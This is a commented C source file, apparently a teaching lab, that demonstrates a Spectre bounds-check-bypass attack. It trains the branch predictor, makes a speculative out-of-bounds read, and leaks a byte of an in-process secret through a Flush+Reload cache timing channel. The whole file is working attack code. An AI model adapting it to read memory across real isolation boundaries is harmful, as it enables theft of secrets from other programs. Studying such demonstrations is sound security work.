#include <emmintrin.h>
#include <x86intrin.h>
#include <stdio.h>
#include <stdint.h>

// ----------------------------------------------
// Global Variables
// ----------------------------------------------

// Bounds for restricted access
unsigned int buffer_size = 10;

// Legitimate buffer, only indices 0-9 are valid
uint8_t buffer[10] = {0,1,2,3,4,5,6,7,8,9}; 

// Used to prevent compiler optimization (has no real role in attack)
uint8_t temp = 0;

// Secret string located adjacent to the buffer (intended to be leaked)
char *secret = "A Secret Value";   

// Probe array used for Flush+Reload cache side-channel
// 256 possible byte values * 4096-byte spacing to ensure separate cache lines
uint8_t array[256*4096];

#define CACHE_HIT_THRESHOLD (80)   // Threshold to distinguish cache hit vs. miss
#define DELTA 1024                 // Offset to defeat hardware prefetcher

// ----------------------------------------------
// Victim function that performs bounds check
// ----------------------------------------------
uint8_t restrictedAccess(size_t x)
{
  // A typical sandbox-style check
  if (x < buffer_size) {
     return buffer[x];  // Only legal if x in [0,9]
  } else {
     return 0;          // Otherwise returns 0
  } 
}

// ----------------------------------------------
// Flush all cache lines in the probe array
// ----------------------------------------------
void flushSideChannel()
{
  int i;
  // Step 1: Write to array to ensure it's paged in (prevents COW)
  for (i = 0; i < 256; i++) array[i*4096 + DELTA] = 1;

  // Step 2: Flush all array entries from cache
  for (i = 0; i < 256; i++) _mm_clflush(&array[i*4096 +DELTA]);
}

// ----------------------------------------------
// Measure cache access latency for each array[i]
// Shorter access time → indicates data is in cache
// ----------------------------------------------
void reloadSideChannel()
{
  int junk=0;
  register uint64_t time1, time2;
  volatile uint8_t *addr;
  int i;

  for(i = 0; i < 256; i++){
    addr = &array[i*4096 + DELTA];

    // Measure time to access array[i]
    time1 = __rdtscp(&junk);
    junk = *addr;
    time2 = __rdtscp(&junk) - time1;

    // If access is fast → cache hit → leaked value is i
    if (time2 <= CACHE_HIT_THRESHOLD){
	      printf("array[%d*4096 + %d] is in cache.\n", i, DELTA);
        printf("The Secret = %d.\n",i);
    }
  } 
}

// ----------------------------------------------
// Core Spectre attack logic
// ----------------------------------------------
void spectreAttack(size_t larger_x)
{
  int i;
  uint8_t s;
  volatile int z;
  
  // Step 1: Train branch predictor to expect x < buffer_size to be TRUE
  // This makes speculative execution predict the branch will be taken
  for (i = 0; i < 100; i++) { 
    _mm_clflush(&buffer_size);    // Flush buffer_size to delay resolution
    restrictedAccess(i);         // All legal accesses → training pattern
  }

  // Step 2: Flush the buffer_size again and the side-channel probe array
  _mm_clflush(&buffer_size);
  for (i = 0; i < 256; i++)  { _mm_clflush(&array[i*4096 + DELTA]); }

  // Step 3: Insert small delay to increase speculative window
  for (z = 0; z < 100; z++) { }

  // Step 4: Attack!
  // CPU may speculatively execute restrictedAccess(larger_x)
  // even though larger_x >= buffer_size → out-of-bounds access
  s = restrictedAccess(larger_x);  

  // Step 5: Leak the secret byte into cache via timing side channel
  array[s*4096 + DELTA] += 88;  // This access leaves a trace in cache
}

// ----------------------------------------------
// Entry point
// ----------------------------------------------
int main() {
  flushSideChannel();  // Prepare clean cache state

  // Calculate out-of-bounds index so that buffer[larger_x] points to secret[0]
  size_t larger_x = (size_t)(secret - (char*)buffer);  

  // Launch the attack with the calculated out-of-bounds index
  spectreAttack(larger_x);

  // Check which index in array[] got cached → reveals secret[0]
  reloadSideChannel();

  return (0);
}
